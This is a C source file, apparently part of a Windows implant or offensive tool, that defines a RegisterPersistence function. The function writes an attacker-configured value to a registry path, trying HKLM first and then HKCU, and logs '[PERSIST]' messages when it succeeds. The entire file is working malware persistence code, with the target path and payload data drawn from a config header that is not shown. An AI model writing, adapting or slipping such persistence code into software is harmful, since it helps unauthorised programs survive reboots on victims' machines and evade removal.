#include "../include/config.h"

BOOL RegisterPersistence(void) {
    HKEY hKey;
    LONG ret;

    // Try HKLM first, fallback to HKCU
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        // Calculate the correct size for wide string
        size_t dataLen = (wcslen(PERSIST_VAL_DATA) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)PERSIST_VAL_DATA, (DWORD)dataLen);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKLM)...\n");
            RegCloseKey(hKey);
            return TRUE;
        }
    }

    // Fallback to HKCU if HKLM fails
    if (RegOpenKeyExW(HKEY_CURRENT_USER, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        // Calculate the correct size for wide string
        size_t dataLen = (wcslen(PERSIST_VAL_DATA) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)PERSIST_VAL_DATA, (DWORD)dataLen);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKCU)...\n");
            RegCloseKey(hKey);
            return TRUE;
        }
    }

    return FALSE;
}
